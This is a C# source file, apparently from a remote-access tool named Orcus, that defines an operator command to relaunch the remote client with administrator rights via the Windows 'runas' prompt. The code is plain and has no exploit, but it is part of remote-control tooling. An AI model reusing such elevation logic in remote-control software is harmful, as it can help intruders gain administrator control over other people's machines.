using System;
using System.Diagnostics;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.Client
{
    public class MakeAdminCommand : StaticCommand
    {
        public override Guid CommandId { get; } = new Guid(0x666889db, 0x16a0, 0x814f, 0x95, 0x59, 0x85, 0xfa, 0x84,
            0x42, 0x7c, 0xcb);

        public override string Name { get; } = Resources.StaticCommands.Client_MakeAdminCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Client_MakeAdminCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Client;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            if (!clientInfo.ClientOperator.IsAdministrator)
            {
                var applicationPath = clientInfo.ClientOperator.ClientPath;
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo(applicationPath) { Verb = "runas", Arguments = "/wait" }
                };

                bool succeed;
                try
                {
                    succeed = process.Start();
                }
                catch (Exception)
                {
                    succeed = false;
                }

                if (succeed)
                {
                    feedbackFactory.Succeeded();
                    clientInfo.ClientOperator.Exit();
                }
                else
                    feedbackFactory.Failed();
            }
        }
    }
}